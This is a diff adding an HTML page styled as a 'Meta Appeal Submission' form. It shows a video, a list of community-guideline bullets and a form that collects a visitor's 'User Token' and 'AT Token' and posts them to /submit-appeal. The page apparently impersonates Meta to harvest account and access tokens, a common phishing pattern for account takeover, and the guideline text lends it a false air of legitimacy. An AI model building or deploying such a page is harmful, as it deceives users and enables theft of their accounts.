@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Meta Appeal Submission</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f6f6f6;
+      padding: 20px;
+    }
+    .container {
+      max-width: 600px;
+      margin: auto;
+      background-color: white;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+    }
+    .meta-logo {
+      font-size: 24px;
+      font-weight: bold;
+      color: #1877f2;
+    }
+    .subheading {
+      color: #333;
+      margin-bottom: 15px;
+    }
+    video {
+      width: 100%;
+      border-radius: 8px;
+      margin-bottom: 15px;
+    }
+    ul {
+      background-color: #f0f0f0;
+      padding: 10px;
+      border-radius: 5px;
+    }
+    li {
+      margin-bottom: 5px;
+    }
+    input[type="text"] {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+    button {
+      background-color: #00aaff;
+      color: white;
+      padding: 10px 15px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #008ecc;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="meta-logo">Meta Appeal Submission</div>
+    <div class="subheading">
+      Please watch the video below for instructions on submitting your appeal.
+    </div>
+    
+    <!-- Video -->
+    <video controls>
+      <source src="meta-video.mp4" type="video/mp4" />
+      Your browser does not support the video tag.
+    </video>
+    
+    <!-- Guidelines -->
+    <ul>
+      <li>We promote respectful communication and prohibit hate speech, bullying, and harassment of any kind.</li>
+      <li>We remove content that could lead to real world harm, including violence, criminal activity, or dangerous organizations.</li>
+      <li>We protect personal privacy and intellectual property rights, requiring permission to share private content.</li>
+      <li>We maintain platform authenticity by preventing spam, fake engagement, and misinformation.</li>
+    </ul>
+    
+    <!-- Appeal Form -->
+    <form action="/submit-appeal" method="POST">
+      <label for="userToken">User Token</label>
+      <input type="text" id="userToken" name="userToken" placeholder="Enter your user token" required />
+
+      <label for="atToken">AT Token</label>
+      <input type="text" id="atToken" name="atToken" placeholder="Enter your AT token" required />
+
+      <button type="submit">Submit Appeal</button>
+    </form>
+  </div>
+</body>
+</html>
+request
